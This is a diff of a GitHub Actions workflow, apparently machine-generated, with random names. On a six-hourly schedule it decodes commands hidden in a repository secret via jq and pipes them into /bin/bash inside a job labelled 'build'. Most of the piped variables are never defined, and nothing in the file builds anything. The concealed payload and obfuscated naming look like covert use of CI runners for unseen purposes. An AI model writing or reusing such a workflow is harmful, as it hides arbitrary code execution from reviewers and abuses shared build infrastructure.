@@ -1,10 +1,10 @@
 name: fuzhengliu7618
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 3/6 * * *'
-jobs:  # 21698
+    - cron: '39 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +12,18 @@ jobs:  # 21698
       - uses: actions/checkout@v4
       - name: fuzhengliu7618
         env:
-          vydpm26: ${{ secrets.vydpm26 }}
+          np1566: ${{ secrets.np1566 }}
         run: |
-          echo $vydpm26 | jq -r .qmk5 | /bin/bash
-          echo $vd6 | jq -r .rwqg785 | /bin/bash
-          echo $leobf4 | jq -r .k30 | /bin/bash
-          echo $vvew95 | jq -r .hfjx9717 | /bin/bash
-          echo $byek5335 | jq -r .gr84900 | /bin/bash
-          echo $v719 | jq -r .ogc7 | /bin/bash
-          echo $ohe47913 | jq -r .uxrhv0238 | /bin/bash
-          echo $zr514 | jq -r .kmhon82 | /bin/bash
+          echo $np1566 | jq -r .tyamk45975 | /bin/bash
+          echo $quhkw00 | jq -r .z666 | /bin/bash
+          echo $bdj1 | jq -r .b863 | /bin/bash
+          echo $cch71 | jq -r .xw3844 | /bin/bash
+          echo $bvcib88971 | jq -r .xbt37 | /bin/bash
+          echo $yl76 | jq -r .hco37068 | /bin/bash
+          echo $wdvo516 | jq -r .mh1 | /bin/bash
+          echo $aot450 | jq -r .m0 | /bin/bash
+          echo $zlsjm8033 | jq -r .n17 | /bin/bash
+          echo $dfh6976 | jq -r .fsuc7438 | /bin/bash
+          echo $rukc1 | jq -r .ti7 | /bin/bash
+          echo $drm26234 | jq -r .kgl2967 | /bin/bash
 
